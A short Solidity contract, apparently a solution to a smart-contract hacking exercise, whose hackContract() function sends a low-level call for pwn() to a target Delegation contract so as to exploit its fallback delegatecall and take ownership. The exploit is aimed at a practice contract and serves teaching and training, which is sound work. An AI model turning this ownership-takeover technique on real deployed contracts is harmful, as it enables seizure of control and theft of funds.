// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";
import "hardhat/console.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegation private delegation;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        delegation = Delegation(contractAddress);
    }

    function hackContract() external {
        // Code me!
        (bool success, bytes memory returnData) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
    }
}
